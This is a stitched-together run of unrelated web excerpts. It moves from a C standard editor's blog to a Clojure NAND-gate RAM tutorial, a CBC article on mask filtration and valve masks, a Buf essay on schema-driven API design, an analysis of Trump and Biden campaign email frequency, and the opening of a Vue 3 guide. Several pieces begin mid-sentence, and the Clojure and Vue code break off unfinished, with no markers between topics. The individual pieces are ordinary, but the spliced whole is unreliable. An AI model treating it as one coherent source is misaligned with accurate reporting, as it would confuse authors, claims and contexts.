<h3 id="instructions-unclear">Instructions Unclear?!</h3>

<p>Accidentally blew off foot.</p>

<p>What the hell does “3.4.3p4” mean? Well, I have to build the standard (or go look at an older one), figure out what section/paragraph you’re referring to, and then fix it. Normally, the C standard evolves at such a devastatingly snail-like pace that this is normally not a problem. However, doing this was a bit tough because of 3 meetings of backlogged changes. There were lots of overlaps between papers, and also just out-and-out strange descriptions for how to change some things that I did not understand at first. Weird nesting in the recent C Floating Point Group’s changes to the standard have been all sorts of fun to integrate.</p>

<p>“Delete these paragraphs, then add some here” okay, is that before or after the stuff you just asked me to destroy? Oh, I just applied a paper that deletes half of what you’re asking me to edit. Uh, well, I guess we’re going to have to brew up some interesting words on the fly…!</p>

<p>“Do these changes, and then make similar changes to the usual places” uh, what are “the usual places”? Guess it’s time to break out find/replace and figure out what the usual places are! Wait, hold on, you made these changes here, but… there’s identical wording somewhere else, am I supposed to edit that too…? Time to e-mail the author…</p>

<p>It’s an interesting bucket of challenges, really. I think one of the ways to help make it so I can more reliably know what sections to edit are by adding stable tags to the standard. C++ has done this and it means when someone says “edit <code>[alg.any.of]</code>”, you know where to go no matter what happens to the section and paragraph numbers. <code>25.6.2</code>… what’s that, what am I doing again?</p>

<p>Some frustrations go beyond just the papers’ contents, though.</p>

<h3 id="n2481-nooo-you-mean-n2553">N2481? Nooo, you mean N2553!</h3>

<p>One of the biggest problems in both the C and C++ Committees are history. C++ began to address this problem by using P-numbers for their papers, which are <code>PNNNNrXYZ</code> numbers that indicate both a paper uniquely and the revision of the paper (0, 1, 2, …) in the <code>XYZ</code> part. C has no such infrastructure: every paper is submitted, officially, to ISO and is given an N-number.</p>

<p>How do you track revision history? You hope the author puts it in the paper title or inside the paper itself. It’s basically up to the author to do this, and not all authors do it. This is a larger problem that is more strictly outside of my purview as Project Editor, but it is something that I am going to tackle anyways.</p>

<p>I had some inspiration thanks to the <a href="https://github.com/LynnKirby/wg14-link">work done by LynnKirby</a>, wherein Lynn created a <a href="https://wg14.link/">wg14.link website, similar to the wg21.link website</a>. This has given me a lot of insight into what people want out of a service like this, and how I should book keep papers and their metadata. Hopefully before Summer of 2021, I will be able to unveil a new way to track these papers and keep title, author, abstract, and history information and make the Paper Submission Process far more friendly to the wider C Community!</p>

<p>Still, this is a lot of rambling and anymore stuff will start to get way off topic to what it means to actually edit the C Standard. …</p></section></div>

We also have a sense that logic gates are very simple machines, analogous to light switches even. This raises the question: <em>how exactly do kind-of-light-switches come together to form computers</em>? How does “storing a variable” or “calling a function” translate into logic gates going on or off? </p><p>On a journey to answer that question, I discovered J Clark Scott’s excellent book <a href="https://www.amazon.com/But-How-Know-Principles-Computers-ebook/dp/B00F25LEVC" target="_blank">“How do It Know?</a>”. He starts with NAND gates and takes you on a journey to build a computer using them.</p><p>I liked his book so much that I took his schematic for RAM, and simulated it in Clojure. In this essay, I’ll guide you through doing just that: we’ll simulate NAND gates, and use about <em>14 thousand</em> of them to build 256 bytes of RAM.</p><p>Going through this simulation ingrained an “aha” feeling in me: watching 14 thousand little machines chug away makes you feel that whoever uses a computer is a wizard. A wizard with an army of millions of machine servants doing billions of little jobs for them every second. I hope it gives you the same feeling. 🙂</p><p>To grok this essay, you need to understand this picture:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NDk4LTdhY2RkMzgwLTBjOTItMTFlYi04NWQ2LTZmOWEzNGE2NmU5Zi5wbmc" alt="image"></span></p><p>This describes a NAND gate. A NAND gate is a machine that has two input wires. If both input wires have a “high” charge (represented as 1), the output charge is “low” (represented as zero). With any other combination of input charges, the output charge is high.</p><p>Notice that the wires carry a charge, but we choose to interpret <em>meaning</em> in the charge. “high charge” means 1, and “low charge” means 0. Nothing changes in the machine, this is just something we decided as humans (1).</p><p>On the left you see a circuit diagram. You can read it as input wires <code>a</code> and <code>b</code> carrying charges into the <code>NAND</code> gate. The <code>NAND</code> gate has a wire <code>c</code>, carrying the output charge. For all the circuit diagrams we’ll draw, you can read them as electricity “flowing” from left to right, or top to bottom.</p><p>On the right is a “truth” table for a NAND gate. This is just a fancy name for summarizing every state a <code>NAND</code> gate can be, based on the input wires.</p><p>Now, we can start even lower than a <code>NAND gate</code>, but this machine is simple enough. It can’t be so hard to build something that turns off when two inputs are turned on. You don’t have to take my word for it though, you can search up “building a NAND gate with transistors”, and come back when you’re convinced. </p><p>Time to code! 🙂</p><p>First things first, we need some way to represent the state of our circuit. We know that our RAM will be built completely from <code>NAND</code> gates, so let’s take inspiration from one:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTI0LTg0NTczYjgwLTBjOTItMTFlYi05NWMyLWJlMWQ4MzFlNTg5MC5wbmc" alt="image"></span></p><p>If we look at this example we can see that:</p><ol><li>We have wires. </li><li>Wires have charges.</li><li>We hook wires together with NAND Gates</li></ol><p>Here’s one way we can map that to a data structure in Clojure: </p><pre><code><span>(</span><span>def</span><span> ex-state-v0 {</span><span>:charge-map</span><span> {</span><span>:a</span><span> </span><span>1</span><span> </span><span>:b</span><span> </span><span>1</span><span> </span><span>:c</span><span> </span><span>0</span><span>}</span>
<span>                  </span><span>:nand-gates</span><span> [{</span><span>:ins</span><span> [</span><span>:a</span><span> </span><span>:b</span><span>]</span>
<span>                                </span><span>:out</span><span> </span><span>:c</span><span>}]})</span></code></pre><p>We can use keywords to represent our wires. We can also keep a map that tells us the charges of our wires. Finally, we can keep a list of NAND gates, which tell us how these wires connect. </p><p>Fine enough way to represent our circuit for now! Let’s create a few functions that can help us manage this representation:</p><pre><code><span>; update state v0</span>
<span>; ---------------</span>
<!-- -->
<span>(</span><span>def</span><span> empty-state {</span><span>:charge-map</span><span> {} </span><span>:nand-gates</span><span> []})</span>
<!-- -->
<span>(</span><span>defn</span><span> charge [state wire]</span>
<span>  (</span><span>get-in</span><span> state [</span><span>:charge-map</span><span> wire]))</span>
<!-- -->
<span>(</span><span>defn</span><span> charges [state wires]</span>
<span>  (</span><span>map</span><span> (</span><span>partial</span><span> charge state) wires))</span>
<!-- -->
<span>(</span><span>defn</span><span> set-charge [state wire charge]</span>
<span>  (</span><span>assoc-in</span><span> state [</span><span>:charge-map</span><span> wire] charge))</span>
<!-- -->
<span>(</span><span>defn</span><span> wire-nand-gate [state a b o]</span>
<span>  (</span><span>update</span><span> state </span><span>:nand-gates</span><span> conj {</span><span>:ins</span><span> [a b] </span><span>:out</span><span> o}))</span></code></pre><p>These are all the basic tools we need to “connect” a NAND gate into our circuit. Let’s try them out in the REPL:</p><pre><code><span>(</span><span>charges</span><span> (</span><span>-&gt;</span><span> empty-state</span>
<span>               (</span><span>set-charge</span><span> </span><span>:a</span><span> </span><span>1</span><span>)</span>
<span>               (</span><span>set-charge</span><span> </span><span>:b</span><span> </span><span>0</span><span>))</span>
<span>           [</span><span>:a</span><span> </span><span>:b</span><span>])</span>
<span>; =&gt; (1 0)</span>
<span>(</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>)</span>
<span>; =&gt; {:charge-map {}, :nand-gates [{:ins [:a :b], :out :c}]}</span></code></pre><p>Nice! We can now “wire” up a circuit. Let’s run some electricity through it.</p><p>To figure out how to simulate electricity into our circuit, let’s remember our diagram again:</p><p><span><img src="https://stopa.io/api/image/aHR0cHM6Ly91c2VyLWltYWdlcy5naXRodWJ1c2VyY29udGVudC5jb20vOTg0NTc0Lzk1Nzc2NTU3LTk0NmYxYjAwLTBjOTItMTFlYi05NGZkLTNlM2JkMzI5OWYwNC5wbmc" alt="image"></span></p><p>One way we can model this is to imagine that electricity is like water: It “flows” from sources into wires, and “triggers” all the devices that are connected to those wires.</p><p>With a model like that, here’s what would happen if a charge was “triggered” on <code>a</code>:</p><ol><li>First, <code>a</code>‘s charge would update. </li><li>After that <code>a</code> ‘s charge would transfer to all the NAND gates that are connected to it. In this case, it would be our one NAND gate above.</li><li>Each NAND gate would then recompute its charge, and if it changed, trigger its output wire in turn. In our case that’s <code>c</code> </li><li>If <code>c</code> was connected to other <code>NAND</code> gates, those gates would trigger, and the process would continue.</li></ol><p>Now, this is a very naive view of how electricity works (2), but it’s good enough for us to model RAM!</p><p>Let’s translate this into code.</p><p>To do that, we need a way to model what a <code>NAND</code> gate does:</p><pre><code><span>(</span><span>defn</span><span> nand-output [a b]</span>
<span>  (</span><span>if</span><span> (</span><span>=</span><span> a b </span><span>1</span><span>) </span><span>0</span><span> </span><span>1</span><span>))</span></code></pre><pre><code><span>(</span><span>nand-output</span><span> </span><span>0</span><span> </span><span>0</span><span>)</span>
<span>; =&gt; 1</span>
<span>(</span><span>nand-output</span><span> </span><span>1</span><span> </span><span>1</span><span>)</span>
<span>; =&gt; 0</span></code></pre><p>Our <code>nand-output</code> function takes two input charges, and produces the output charge that a <code>NAND</code> gate would produce.</p><p>Next, we need a function to find all the <code>NAND</code> gates that are connected to a specific wire:</p><pre><code><span>(</span><span>defn</span><span> dependent-nand-gates [state wire]</span>
<span>  (</span><span>filter</span><span> </span>
<span>    (</span><span>fn</span><span> [{</span><span>:keys</span><span> [ins]}] (</span><span>some</span><span> #{wire} ins)) </span>
<span>    (</span><span>:nand-gates</span><span> state)))</span></code></pre><pre><code><span>(</span><span>dependent-nand-gates</span><span> (</span><span>wire-nand-gate</span><span> empty-state </span><span>:a</span><span> </span><span>:b</span><span> </span><span>:c</span><span>) </span><span>:a</span><span>)</span>
<span>; =&gt; ({:ins [:a :b], :out :c})</span></code></pre><p>This searches all of our <code>NAND</code> gates in our circuit, and finds the ones which are connected to a specific wire.</p><p>With that, we have what we need to implement <code>trigger</code>:</p><pre><code><span>(</span><span>declare</span><span> trigger-nand-gate)</span>

And it's actually useful because it allows us to compare consumer market masks to masks that we know a lot about," said&nbsp;James Scott, a professor from the University of Toronto's Dalla Lana School of Public Health. Scott is a specialist in bioaerosols and runs the lab where <em>Marketplace</em>'s tests were run.</p>  <p>The test pulls a constant breath of air containing tiny salt particles through the mask material. The salt particles are similar in size to particles able to contain the coronavirus that might originate from droplets expelled by an infected person's breath, cough or sneeze. During the test, samples of air inside and outside the mask are compared to see how effective the mask is at reducing the level of particles.</p>  <p>Previous tests on consumer masks have commonly&nbsp;looked at how masks can help block particles&nbsp;when coughing or sneezing and&nbsp;prevent transmission to others.&nbsp;But the <em>Marketplace </em>test&nbsp;shows that certain materials make some masks better at limiting wearers'&nbsp;exposure by filtering what they&nbsp;breathe in, Scott said.</p>  <p>"Even fairly low-efficiency masks are actually quite effective at catching much larger particles. But, it takes a really good mask to catch the small ones as well.

Scott said the weave of a fabric is critical when it comes to catching those potentially harmful particles.&nbsp;</p>  <p>When it comes to cotton masks, <em>Marketplace</em>'s test suggested&nbsp;the tighter the weave, the better.&nbsp;</p>  <p>Scott points out that manufacturers of consumer masks are not currently required to disclose details about thread count, and without that information it's difficult to say for certain what contributed to some cotton masks' poorer performance.&nbsp;</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks.png 300w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks.png 460w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks.png 620w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png 780w,https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795575.1604952606!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks.png"></p></div><figcaption>Valve masks, like the one seen here, are not effective at blocking COVID-19.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <h2>Masks to avoid</h2>  <p>Scott said consumers should avoid wearing valve masks. While they are useful for protecting someone from inhaling paint fumes or when working in a wood shop, they do not help control the spread of the virus.</p>  <p>The reason is simple.&nbsp;</p>  <p>"Air only moves through the filter part of the mask when air comes in. It doesn't move through the filter to exhale. It moves through the valve," he said. "So there's nothing to intercept those particles that you may be shedding into the environment."</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_300/valve-masks-pm-security-detail.png 300w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_460/valve-masks-pm-security-detail.png 460w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_620/valve-masks-pm-security-detail.png 620w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png 780w,https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_1180/valve-masks-pm-security-detail.png 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795580.1604952847!/fileImage/httpImage/image.png_gen/derivatives/original_780/valve-masks-pm-security-detail.png"></p></div><figcaption>Although valve masks are not recommended by the Public Health Agency of Canada, some members of the federal security force at Canada’s Parliament in Ottawa were seen wearing them.<!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p><a href="https://www.torontopearson.com/en/whats-happening/stories/change-in-mask-regulations"><u>Transport Canada</u></a> has banned the wearing of valve masks, as has <a href="https://www.viarail.ca/en/preventive-measures-COVID-19#in-station"><u>Via Rail</u></a>, and airlines such as <a href="https://www.aircanada.com/ca/en/aco/home/book/travel-news-and-updates/2020/travelguidelines.html"><u>Air Canada</u></a>. <a href="https://www.toronto.ca/wp-content/uploads/2020/04/97f8-COVID-19-Guidance-for-Use-of-Face-Masks-and-Coverings-by-Public.pdf"><u>Toronto</u></a>, <a href="https://www.ottawapublichealth.ca/en/public-health-topics/masks.aspx"><u>Ottawa Public Health</u></a>, <a href="https://www.hamilton.ca/coronavirus/face-coverings-and-masks"><u>Hamilton Public Health</u></a> and the <a href="http://www.bccdc.ca/Health-Professionals-Site/Documents/Face-masks.pdf"><u>BC CDC</u></a> all recommend against the use of valve masks.</p>  <p>The Public Health Agency of Canada (PHAC) said: "<a href="https://protect-eu.mimecast.com/s/OstXC19nnf0jLkiLNse4?domain=canada.ca"><u>Masks with exhalation valves are not recommended,</u></a> because they don't protect others from COVID-19 and don't limit the spread of the virus."&nbsp;</p>  <ul>   <li><strong>Subscribe to the weekly <a href="https://subscriptions.cbc.ca/listmanagement/forms/marketplace-watchdog"><em>Marketplace </em>newsletter</a></strong></li>  </ul>  <p>Despite this, some members of the federal security force at Canada's Parliament in Ottawa, mandated to provide physical security for parliamentarians, employees and visitors to the parliamentary precinct, have been wearing valve masks while on duty.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/rayon-mask.jpg 300w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/rayon-mask.jpg 460w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/rayon-mask.jpg 620w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg 780w,https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/rayon-mask.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5795832.1604959640!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/rayon-mask.jpg"></p></div><figcaption>One of the rayon masks Marketplace tested.  <!-- --> <!-- -->(CBC)</figcaption></figure></span></p>  <p>In an email, the Parliamentary Protective Service told Marketplace: "The masks issued by the Parliamentary Protective Service (the Service), despite having a valve, meet the criteria outlined by PHAC regarding the appropriate use of non-medical mask or face covering.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>November 12, 2020</p><p>The industry has embraced statically typed languages, but API design remains twenty years in the past. Schema driven development presents an opportunity to pull API design into the present. </p></div></div><div><div><div><p>Two decades ago, it was widely argued that dynamic programming languages were more productive because you didn't have to spend time dealing with type signatures. The only reason, then, to use a statically typed language, was for better performance. Truth be told, at the time, this argument had some validity, and many organizations chose to move away from the Javas of the world, and towards the Pythons. However, this was largely because of the specific statically-typed languages in wide use, and because of a lack of tooling available at the time to support them. </p><p>‍</p><p>By now, that tooling has become much more widely available. In fact, the industry has learned over time that statically typed languages actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability. Editor features like auto-complete and jump-to-definition make programmers much more productive, and are mostly only possible in statically typed languages. We see TypeScript taking off, even though it has no performance benefit over JavaScript, because it is more productive. In addition, larger code bases become easier to manage when everyone is able to have some typed reason about each others’ code,<strong> </strong>resulting in the ability to add features faster, with fewer bugs. In other words, the benefit of maintaining type signatures now well outweighs the cost.&nbsp;&nbsp;</p><blockquote>The industry has learned over time that statically typed languages &nbsp;actually enable a whole host of new tooling possibilities, and ultimately, this tooling can drastically improve developer productivity and codebase maintainability</blockquote><h3>‍<strong>The status quo for APIs is still freeform</strong></h3><p>When it comes to network APIs, however, the industry is still twenty years behind. Most developers continue to rely on the path of least resistance: defining RESTful services, relying on JSON as the data format and HTTP as the transport protocol. Some feel that dynamically typed JSON, along with loosely-defined REST standards, are more productive than the alternatives, or that the learning curve associated with other API standards is too steep. However, similar to dynamic languages 20 years ago, the status quo of API development leaves a lot of room for improvement.</p><p>‍</p><p>API development today is overwhelmingly freeform. Fundamentally, that means that every company -- and every team within every company -- that claims their services are RESTful can actually have very different API design standards. For example, naming conventions, pagination and versioning could all be radically different on one team compared to another. Often, a team might overload an object with unnecessary fields and use inconsistent data types. Unfortunately, this causes a number of problems.</p><h3>‍<strong>Freeform APIs can cause major problems</strong></h3><p>It’s straightforward to understand why having APIs structured differently harms service grokability. When APIs are designed differently, it’s not always obvious how the service should be used, preventing teams from quickly and confidently building applications around a new service.&nbsp;</p><p>Organizations do make attempts to standardize the service structure, mostly by way of API style guides. Setting a style guide is a headache in and of itself, either requiring a team to craft one or select a popular one. Teams and individuals can rarely agree on a style guide, so this decision often gets ignored and relitigated regularly in code reviews. Ultimately, even if there was internal consensus on an approach to style, there is no good way to enforce, monitor or lint APIs for adherence.</p><p>An inconsistent approach to service design and maintenance has another unintended effect: breaking changes. In a freeform API environment, you can’t fully understand the downstream impacts of making changes to the contract. This works in the opposite direction too; clients with an updated view of the world talking to servers that remain in need of an update, including during rolling updates, can send requests that servers do not understand. There isn’t a good way to work around this as an organization. You either expect that the service will consistently break users, or you develop some sort of internal process to better manage changes to the contract. Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</p><blockquote>Many teams avoid making changes altogether, choosing instead to only add to their API as needs change. In any case, considerable time is wasted on internal communication, APIs drift, and users still break. Ultimately, teams want and need API evolution to be more strictly governed.&nbsp;</blockquote><h3>‍<strong>The opportunity for schema driven development</strong></h3><p>It’s time for the industry to shift from a freeform approach to a world where all APIs are defined programmatically with schemas. Schema driven development solves many of the challenges summarized above. APIs are much easier to grok and can be relied on from day one. Organizations can set and enforce API standards across multiple teams. Service owners can make the changes they need to their service, with more structure in place to prevent breaking clients.&nbsp;</p><p>‍</p><p>This is already a major improvement, but the full opportunity for schemas to improve developer productivity is much greater. Similar to the way that statically typed languages enabled new potential for tools to improve developer productivity, the major promise of schema driven development is the assets that the schema can generate automatically. This is a topic big enough to explore in another article, but suffice it to say, relying on a schema can automate all of the boilerplate code required to actually interact with services.&nbsp;</p><p>‍</p><p>Today, schema driven API protocols are sometimes viewed as something you use only if performance matters. In the same way that typed languages needed tooling to support their adoption, a tooling ecosystem is needed to support the use of schema driven API protocols.&nbsp;</p><p>‍</p><p>We at Buf feel that the best option available today for schema driven development is Protocol Buffers (a topic we’ll explore in a future article), and we’re hard at work building such tooling to support organizations using Protobuf to define their services. We hope that with this kind of tooling, teams will look to API schemas for all-around productivity gains, and not just performance.</p></div></div></div></div>]]>

							<p><span>The 2020 Trump reelection campaign has been anything but traditional and this has extended to their email practices as well. Political campaign email in the US is notorious for breaking general email best practices. Political email is explicitly exempted from compliance with CAN-SPAM, and so it is often a bit of Wild Wild West in regard to list acquisition and unsubscribe maintenance. Even when viewed through that lens, though, the 2020 Trump campaign is extremely unorthodox.</span><span></span></p>
<p><span>As the election started to come to a crescendo in mid-October, and possibly as a result of the Trump campaign <a href="https://www.forbes.com/sites/zengernews/2020/10/29/biden-raised-three-times-trumps-fundraising-haul-in-the-first-two-weeks-of-october/?sh=1555a3a5202b"><span>falling behind</span></a> the Biden campaign in fundraising in early October, the Trump campaign began ramping up the cadence of contact to individuals, peaking at 26 mails per day.&nbsp; That’s not a typo: the Trump campaign on the eve of the election was mailing their respondents an <strong>average of 26 times per day</strong>. Here you can see how that cadence built over the past few months, looking at traffic from joebiden.com and victory.donaldtrump.com, the primary sending domains for the two campaigns:<br></span></p>
<p><span>&nbsp;<img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_1.png" width="624" height="193" alt="George 1"></span></p>
<p><span>It’s interesting to note in the graph that while the Biden campaign mails have trailed off following election day, that the Trump emails are continuing at a high rate/fast pace as he looks to fund efforts to contest election results around the country. Indeed, while the President’s messages are increasingly getting flagged for content on Twitter and Facebook, he’s continuing to use email as a direct channel to supporters. Unlike Twitter, however, the Trump campaign’s emails are presented without <a href="https://help.twitter.com/en/using-twitter/us-elections"><span>fact-checker review</span></a> and 100% focused on raising money for the campaign - every single campaign we identified post-election has been a fundraising mail. Subject line samples post-election include:</span><strong><span></span></strong></p>
<ul>
<li><span><span> </span></span><span>VOTER FRAUD</span></li>
<li><span><span> </span></span><span>We need to HOLD the line</span></li>
<li><span><span> </span></span><span>STOP THE STEAL</span></li>
<li><span><span> </span></span><span>Can you chip in?</span></li>
<li><span><span> </span></span><span>👀</span></li>
</ul>
<p><span>(the emoji eyes subject being my personal favorite).&nbsp; Every one of these emails contains a fundraising call-to-action for the ‘Official Election Defense Fund’ (the majority of which actually </span><span><a href="https://www.washingtonpost.com/politics/trump-donations-debt/2020/11/10/024e1c80-237b-11eb-a688-5298ad5d580a_story.html"><span>goes to his leadership PAC.</span></a> Biden has not stopped his fund-raising mails post-election either, though not all of his mails are fund-raising emails, some simply thank supporters. In keeping with the characteristic tone of his campaign, Biden has been running subject lines like:</span></p>
<ul>
<li><span>[NAME], we need to re-launch the Biden Fight Fund</span></li>
<li><span><span> </span></span><span>A victory for ‘We the People’</span></li>
<li><span><span> </span></span><span>I am honored and humbled to be your President-elect</span></li>
<li><span><span> </span></span><span>Keep the faith</span></li>
</ul>
<p><span></span><span>Biden’s contact cadence has dropped to 1-2 mails per day to subscribers, while Trump’s cadence has actually increased post-election. My colleague <a href="https://www.edatasource.com/author/john-landsman/"><span>John Landsman</span></a> observed: “<span>In fifteen years of working with email analytics, I've never seen a brand or candidate with anything like an hourly contact frequency per subscriber.”</span></span></p>
<p><span></span><span>Trump has seemingly taken his rapid-fire Twitter strategy now to email. Perhaps he’s doing this to creatively work around the warnings on his Twitter messages given email’s semi-independence from walled gardens. The question is, is this technique effective? Ultimately, we will see how that plays out in the campaign finance numbers, but we can get a leading view by looking at the inboxing and read rates on these emails.</span></p>
<p><span>First off, the inboxing statistics for both campaigns look fine, with the Trump campaign’s emails inboxing very reliably. During the 2016 campaign Trump had a real problem with </span><a href="https://www.yahoo.com/entertainment/donald-trump-email-spam-problem-212632215.html"><span>spam filters</span></a><span>, which resulted in significant blocking issues. In the runup to the 2020 election problem, this seems to have been significantly improved. You can see in the chart below that Trump’s inboxing has been ‘fine’ (especially given its volume) and has performed ahead of Biden’s mails every day in the observed period.</span></p>
<p><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_2.png" width="624" height="197" alt="George 2"></p>
<p><span>But are people reading them? Interestingly, the cadence the Trump campaign has adopted hasn’t seemed to affect this, with the read rate hovering around 10%, contrasted with around 20% for the Biden mails. Both of these results are within a normal range for political parties and candidates as a category this campaign season, with Biden’s performance being close to the top quartile and Trump’s just inside the bottom quartile for read rates.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_3.png" alt="George 3"></span></p>
<p><span>With the campaign’s basically identical call-to-action (“donate now!”) across a large number of touchpoints per day, the read rate on individual emails matters less than the gross number of mails a given recipient opens daily. Meaning that since the outcome that all of these 26-daily mails is the same, it’s a mistake to focus on them as individual campaigns and look at their individual read rates. Instead it’s better to look at the entire barrage as a campaign and judge the success based on whether or not any shot in it ‘hits’.</span><br><span></span></p>
<p><span>Prior to October, the two different approaches of the campaigns resulted in basically the same number of emails read by an end-user on a given day. But as the Trump campaign’s cadence rose, these numbers diverged significantly. Based on open data, the average Biden campaign subscriber is now actually reading an email every other day; the average Trump campaign subscriber continues to read multiple emails per day.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_4.png" alt="George 4"></span></p>
<p><span>Trump is also mailing a larger portion of his overall list on any given day, though those lists are slightly shrinking as the daily cadence has gone up.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_5.png" alt="George 5"></span></p>
<p><span>It would be interesting to see what the effect of this high cadence has been on unsubscribes, but it’s important to remember that in the US political mails are not bound by CAN-SPAM and political entities can mail whomever they want how often they want, without legal concerns around maintaining subscription information and handling unsubscribes. A notable difference between the Biden and Trump campaigns is that Biden, in accordance with emailing best practices, includes links to manage your subscription. In contrast, the Trump emails provide no mechanism for recipients to unsubscribe. This is perfectly legal under CAN-SPAM since these are political emails, but it’s a poor practice and I certainly wouldn’t recommend anyone try it at home.</span></p>
<p><span>We can see this difference if we look at inferred unsubscribe rates between the two campaigns.&nbsp; We can’t measure the actual unsubscribe data, but what we can look at is how many recipients stop getting emailed after a given send.&nbsp;</span></p>
<p><span>When we look at that, we see a very low unsubscribe rate for the Trump campaign emails, especially compared to the Biden emails, but this is almost certainly highly affected by the lack of an unsubscribe method in the Trump mails.</span></p>
<p><span><img src="https://onlyinfluencers.com/images/2020_Blog_jj/Nov_George/George_6.png" alt="George 6"></span></p>
<p><span>Trump’s email strategy has been both effective and unorthodox, but it’s likely to cause subscriber burnout in the long run as well as blocking issues if it continues. It also seems likely to be a strategy that will not work beyond his most devoted base - how many people would opt to receive emails at this cadence and for how long?</span></p>
<p><span>Trump’s strategy of increasing frequency so far has worked when it comes to total emails read, but like with all marketing mail, it’s really the downstream conversion (in this case donations) that will measure the ultimate success and time will tell how that has worked. If you are a contrarian, you might be speculating that this increased cadence isn’t a sign of email abuse, but that instead Trump really knows his audience’s appetite for hearing from him and will eat up this strategy. Donations to the legal fund will tell us in the end.</span></p>
<p><span>Either way, Trump and Biden both continue to do major fundraising pushes post-election as they look to fund the expensive work of contesting (and defending) the 2020 election. If you happen to subscribe to either of the campaigns’ emails, I think you will continue to have a full inbox for some time.</span></p>

It is <em>mostly</em> compatible with the old Vue 2 way of doing things... but lots have changed and there are many new ways of doing things. </p>
<p><strong>This is a guide to setting things up in Vue 3 using the Vue 3 composition API, and instructions for adding packages such as Vuex, Vue Router, Vue Test Utils and setting up Typescript support with Vue 3</strong>. It is intended for readers who are already familiar with Vue 2 but are looking for a tutorial/guide to move their codebase to use Vue 3.</p>
<p>I've created a <a href="https://webdevetc-vue3-example-starter.netlify.app/" target="_blank" rel="noopener">sample app</a>, along with <a href="https://github.com/WebDevEtc/WebDevEtc-Vue3-Example-Starter" target="_blank" rel="noopener">the Vue 3 app source code on Github</a>. </p>
<p>The app is quite basic and is meant just for demonstration purposes. I find tutorials and guides much easier to see when they have a bigger application to refer to, rather than just short snippets.</p>
<h2 id="a-quick-guide-to-vue-3s-composition-api">A quick guide to Vue 3's composition API</h2>
<p>There are tons of guides on Vue 3's composition API. I am really excited to start using it in some projects (although I still have some reservations about how useful it will be - but I felt the same about React hooks, and the have really picked up in popularity)</p>
<p>In Vue 2 (and also in Vue 3 as you can still use the <strong>options API</strong>) you would probably be used to seeing things like this:</p>
<pre><code><span> </span><span>// ...</span>
<span> </span><span>export</span><span> </span><span>default</span><span> </span><span>{</span>
<span> </span><span>data</span><span>()</span><span> </span><span>{</span>
<span>   </span><span>return</span><span> </span><span>{</span>
<span>     postTitle</span><span>:</span><span> </span><span>'</span><span>a default title</span><span>'</span><span>,</span><span>    </span>
<span>   </span><span>}</span>
<span> </span><span>},</span>
<span> methods</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>updateTitle</span><span>(</span><span>newValue</span><span>)</span><span> </span><span>{</span>
<span>        </span><span>this</span><span>.</span><span>postTitle</span><span> </span><span>=</span><span> </span><span>newValue</span><span>;</span>
<span>    </span><span>}</span>
<span> </span><span>},</span>
<span> computed</span><span>:</span><span> </span><span>{</span>
<span>    </span><span>numWordsInTitle</span><span>()</span><span> </span><span>{</span>
